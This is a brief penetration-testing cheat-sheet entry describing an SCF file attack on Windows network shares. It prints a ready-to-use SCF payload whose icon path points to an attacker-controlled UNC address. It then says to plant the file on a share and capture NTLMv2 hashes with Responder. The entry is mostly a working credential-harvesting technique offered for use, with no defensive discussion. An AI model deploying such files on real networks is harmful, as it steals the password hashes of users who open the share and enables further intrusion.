# SCF

SCF (Shell Command Files) files can be used to perform a limited set of operations such as showing the Windows desktop or opening a Windows explorer. SCF file can be used to access a specific UNC path which allows the penetration tester to build an attack. The code below can be placed inside a text file which then needs to be planted into a network share.

Example of such file:

```
[Shell]
Command=2
IconFile=\\X.X.X.X\lol
[Taskbar]
Command=ToggleDesktop
```

You an use Responder to capture the NTLMv2 hash
